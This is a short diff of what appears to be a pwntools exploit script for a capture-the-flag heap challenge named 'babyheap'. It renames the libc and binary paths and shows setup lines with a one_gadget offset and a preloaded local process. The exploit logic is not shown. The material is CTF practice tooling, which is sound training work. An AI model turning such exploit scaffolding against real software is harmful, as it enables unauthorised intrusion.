@@ -3,7 +3,7 @@ from pwn import *
 context.terminal = ['tmux', 'splitw', '-h']
 context.arch = 'x86_64'
 
-libc = ELF('./libc.so.6')
+libc = ELF('./libc.so.6_b86ec517ee44b2d6c03096e0518c72a1')
 libc.symbols['one_gadget'] = 0x41374
 bin_offset = 0x3a5678
 
@@ -41,7 +41,7 @@ def dump(index):
     return data
 
 
-r = process('./babyheap',env={ 'LD_PRELOAD': './libc.so.6' })
+r = process('./babyheap_69a42acd160ab67a68047ca3f9c390b9',env={ 'LD_PRELOAD': './libc.so.6_b86ec517ee44b2d6c03096e0518c72a1' })
 # gdb.attach(r, '''
 # c
 # ''')
